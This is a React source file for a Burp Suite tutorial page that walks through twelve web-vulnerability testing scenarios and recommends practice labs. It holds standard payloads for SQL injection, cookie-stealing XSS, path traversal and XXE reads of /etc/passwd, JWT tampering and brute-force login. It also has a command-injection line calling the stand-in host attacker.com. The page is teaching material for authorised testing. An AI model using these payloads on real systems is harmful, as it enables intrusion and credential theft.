'use client'
import { useEffect } from 'react';
import DocHeading from '@/components/base/DocHeading';
import Callout from '@/components/base/Callout';
import CodeBlock from '@/components/base/Codeblock';
import InlineCode from '@/components/base/InlineCode';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const examples = [
  {
    title: 'SQL Injection Detection',
    desc: 'Use Repeater to inject SQL payloads and observe error messages or boolean-based content differences.',
    steps: [
      'Intercept login request → Send to Repeater',
      'Inject \' OR 1=1 -- into username field',
      'Send request and check: does response differ? Does login succeed without valid credentials?',
      'Try UNION-based: \' UNION SELECT null,null,username,password FROM users --',
      'Check if database content appears in response',
    ],
    payload: "' OR '1'='1' --",
    attack: 'Sniper',
  },
  {
    title: 'Cross-Site Scripting (XSS)',
    desc: 'Inject JavaScript and check if payload is reflected and executed in browser context.',
    steps: [
      'Find a search box or comment form',
      'Send to Repeater → Inject &lt;script&gt;alert(1)&lt;/script&gt;',
      'Send and observe: does script tag appear in response body?',
      'If filtered, try encoding: &lt;ScRiPt&gt;, %3Cscript%3E, etc.',
      'For stored XSS, trigger the stored content in another browser session',
    ],
    payload: '&lt;script&gt;alert(document.cookie)&lt;/script&gt;',
    attack: 'Sniper',
  },
  {
    title: 'Insecure Direct Object Reference (IDOR)',
    desc: 'Test horizontal/vertical privilege escalation by modifying resource identifiers.',
    steps: [
      'Login as user A (e.g., /account/1000)',
      'Note your user ID from response (or session cookie)',
      'Send account request to Repeater → manually change ID to 1001 (user B)',
      'Send and check: does response contain user B data?',
      'Repeat for all numeric IDs, GUIDs, file paths',
    ],
    payload: '/order/12345 → /order/12346',
    attack: 'Sniper',
  },
  {
    title: 'Path Traversal',
    desc: 'Traverse directory structure to read sensitive files outside web root.',
    steps: [
      'Identify file-loading parameter: ?file=report.pdf',
      'Replace with traversal: ../../../etc/passwd',
      'If blocked, double-encode: ..%2F..%2F..%2Fetc%2Fpasswd',
      'Test variations: ....//, %c0%ae, etc. for bypasses',
      'Look for Unix (/etc/passwd) or Windows (C:\\Windows) files',
    ],
    payload: '../../../etc/passwd',
    attack: 'Sniper',
  },
  {
    title: 'SSRF (Server-Side Request Forgery)',
    desc: 'Make server send requests to attacker-controlled host to detect SSRF.',
    steps: [
      'Find URL parameter: ?url=http://internal-server/api',
      'Replace with Collaborator domain: http://abcd1234.burpcollaborator.net',
      'Send request → check Collaborator for DNS/HTTP callback',
      'If blocked, try DNS rebinding, redirect chains, or different protocols',
    ],
    payload: 'http://burpcollaborator.net',
    attack: 'Sniper',
  },
  {
    title: 'Command Injection',
    desc: 'Inject OS commands into parameters that interact with system.',
    steps: [
      'Test command separation: ; id, || id, & id',
      'Test command substitution: $(id), `id`',
      'Check response for command output (uid, gid, username)',
      'If blind, use time-based: ; sleep 5 — does response delay 5 seconds?',
      'Out-of-band: ; nslookup attacker.com to get DNS callback',
    ],
    payload: '; cat /etc/passwd',
    attack: 'Sniper',
  },
  {
    title: 'Brute Force Login with Intruder',
    desc: 'Use Cluster Bomb to try username+password combinations.',
    steps: [
      'Capture login POST request → Send to Intruder',
      'Mark username and password fields as §positions§',
      'Set attack type: Cluster Bomb',
      'Payload set 1: usernames.txt (e.g., admin, root, user)',
      'Payload set 2: passwords.txt (e.g., password123, admin123)',
      'Start attack → filter results by response length/login success message',
    ],
    attack: 'Cluster Bomb',
  },
  {
    title: 'Directory Traversal with Intruder',
    desc: 'Fuzz for sensitive files by iterating through common paths.',
    steps: [
      'Find file parameter: ?page=home.html',
      'Send to Intruder → mark page parameter',
      'Attack type: Sniper',
      'Payload: SecLists/Fuzzing/LFI/common.txt or custom path list',
      'Look for 200 OK vs 404, content-length changes, server errors',
    ],
    attack: 'Sniper',
  },
  {
    title: 'API Parameter Mining with Param Miner',
    desc: 'Discover hidden API parameters that modify application behavior.',
    steps: [
      'Install Param Miner extension',
      'Send a valid API request to Repeater',
      'Right-click → "Param miner" → "Discover parameters"',
      'Load wordlist: params.txt (common param names)',
      'Observe which added parameters change response (non-404)',
      'Test discovered parameters for injection',
    ],
    attack: 'Extension-based fuzzing',
  },
  {
    title: 'JWT Token Tampering',
    desc: 'Modify JWT claims to escalate privileges or bypass authentication.',
    steps: [
      'Capture JWT from Authorization header',
      'Send to Decoder → Base64 decode payload',
      'Modify claims: {"role":"user"} → {"role":"admin"}',
      'Base64 encode modified payload',
      'If signature fails, try "none" algorithm or brute-force weak secret',
      'Send modified token to server with JWT Editor extension',
    ],
    tool: 'JWT Editor / Decoder',
  },
  {
    title: 'XXE (XML External Entity) Injection',
    desc: 'Inject external entity definitions to read files or cause SSRF.',
    steps: [
      'Find XML input (SOAP API, file upload with XML, Content-Type: application/xml)',
      'Inject XXE payload: &lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;',
      'Send and check if file contents appear in response',
      'For blind XXE, use Collaborator DNS: &lt;!ENTITY xxe SYSTEM "http://burpcollaborator.net"&gt;',
    ],
    payload: 'XXE payload above',
    attack: 'Sniper',
  },
  {
    title: 'CSRF Token Bypass',
    desc: 'Test if CSRF token is validated properly by removing or reusing tokens.',
    steps: [
      'Capture a legitimate request with CSRF token',
      'Replay request with token removed or with old token',
      'If server accepts, CSRF protection is broken',
      'Also test: remove entire Referer header; change Origin header',
    ],
    attack: 'Repeater replay',
  },
];

export default function BurpSuiteExamplesPage() {
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-amber/10 border border-cyber-amber/20 text-cyber-amber text-xs font-medium font-mono mb-4">
          <i className="ri-file-list-line" />
          Real-World Testing Scenarios
        </div>
        <DocHeading level={1}>Examples</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Step-by-step testing scenarios covering the most common web vulnerabilities. Each example shows exactly how to configure Burp tools (Repeater, Intruder, Scanner) to find and verify security issues.
        </p>
        <p className="text-cyber-text leading-relaxed mt-2">
          Practice these on intentionally vulnerable applications like WebGoat, DVWA, or HackTheBox web challenges.
        </p>
      </motion.div>

      <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="space-y-4">
          {examples.map((ex, i) => (
            <div key={i} className="cyber-card p-5">
              <div className="flex items-start gap-3">
                <span className="w-7 h-7 rounded-full bg-cyber-red/10 border border-cyber-red/20 text-cyber-red text-xs font-bold flex items-center justify-center flex-shrink-0">
                  {i + 1}
                </span>
                <div className="flex-1">
                  <div className="flex items-center gap-2">
                    <h3 className="text-sm font-semibold text-white">{ex.title}</h3>
                    <span className="text-[10px] px-1.5 py-0.5 rounded bg-cyber-bg border border-cyber-border text-cyber-amber">
                      {ex.attack}
                    </span>
                  </div>
                  <p className="text-xs text-cyber-text mt-1 mb-3">{ex.desc}</p>

                  <div className="mb-3">
                    <h4 className="text-xs font-semibold text-white mb-1">Steps</h4>
                    <ol className="space-y-1">
                      {ex.steps.map((step, j) => (
                        <li key={j} className="text-xs text-cyber-text flex items-start gap-2">
                          <span className="text-cyber-cyan font-mono">{j + 1}.</span>
                          {step}
                        </li>
                      ))}
                    </ol>
                  </div>

                  {ex.payload && (
                    <div>
                      <h4 className="text-xs font-semibold text-white mb-1">Example Payload</h4>
                      <CodeBlock code={ex.payload} />
                    </div>
                  )}
                </div>
              </div>
            </div>
          ))}
        </div>
      </motion.section>

      <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <DocHeading level={2}>How to Practice for Real</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Set up a safe environment to practice these attacks without harming real systems:
        </p>
        <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-3">
          {[
            { name: 'DVWA (Damn Vulnerable Web App)', desc: 'PHP/MySQL vulnerable app covering XSS, SQLi, CSRF, LFI, command execution.' },
            { name: 'WebGoat', desc: 'OWASP-maintained insecure Java app with dozens of lessons.', },
            { name: 'bWAPP', desc: 'Buggy web application with 100+ vulnerabilities. Includes all OWASP Top 10.' },
            { name: 'HackTheBox (Web Challenges)', desc: 'Online CTF platform with live web machines. Range: easy to insane.' },
            { name: 'TryHackMe', desc: 'Guided rooms and CTFs. Includes complete Burp Suite walkthroughs.' },
            { name: 'PortSwigger Web Security Academy', desc: 'Free, official Burp Suite practice labs — the best place to start.' },
          ].map((env, i) => (
            <div key={i} className="cyber-card p-4">
              <h4 className="text-sm font-semibold text-cyber-cyan">{env.name}</h4>
              <p className="text-xs text-cyber-text mt-1">{env.desc}</p>
            </div>
          ))}
        </div>
        <Callout type="warning">
          Only test on systems you own or have explicit permission to test. Unauthorized penetration testing is illegal.
        </Callout>
      </motion.section>

      <motion.section className="mt-12 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="flex gap-3">
          <a href="/burp-suite/pro-tips" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            Next: Pro Tips <i className="ri-arrow-right-line ml-1" />
          </a>
          <a href="/burp-suite/command-builder" className="px-5 py-2.5 rounded-lg border border-cyber-border text-sm font-semibold text-cyber-text hover:border-cyber-amber hover:text-cyber-amber transition-all whitespace-nowrap">
            <i className="ri-arrow-left-line mr-1" /> Back
          </a>
        </div>
      </motion.section>
    </div>
  );
}
